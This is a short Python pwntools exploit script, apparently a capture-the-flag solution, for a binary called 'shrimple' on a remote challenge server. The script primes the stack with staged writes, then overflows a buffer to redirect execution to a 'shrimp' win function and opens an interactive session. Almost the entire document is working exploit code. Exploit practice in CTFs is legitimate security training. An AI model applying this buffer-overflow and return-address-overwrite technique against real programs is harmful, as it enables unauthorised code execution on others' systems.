from pwn import *
context(arch='amd64',terminal=['tmux','new-window'])

elf = ELF('./shrimple')

win_address = elf.sym['shrimp']+5

local = False

def get_logs(r):
    log.info(r.recvuntil(b'>> '))

def send_payload(r,l,c):
    r.sendline(c*l+b'\x00'*4)

def attach_gdb(r):
    if local:
        gdb.attach(r,'''
            b *0x00000000004013f1
            c
        ''')

def exploit(start):
    r = process('./shrimple') if local else remote('chal.competitivecyber.club',8884)

    get_logs(r)
    send_payload(r,start,b'a')
    get_logs(r)
    send_payload(r,start-1,b'b')
    get_logs(r)
    attach_gdb(r)
    r.send(b'\x81'*(start-5)+p64(win_address)+b'\x00\x0a')
    r.interactive()

if __name__ == '__main__':
    exploit(43)
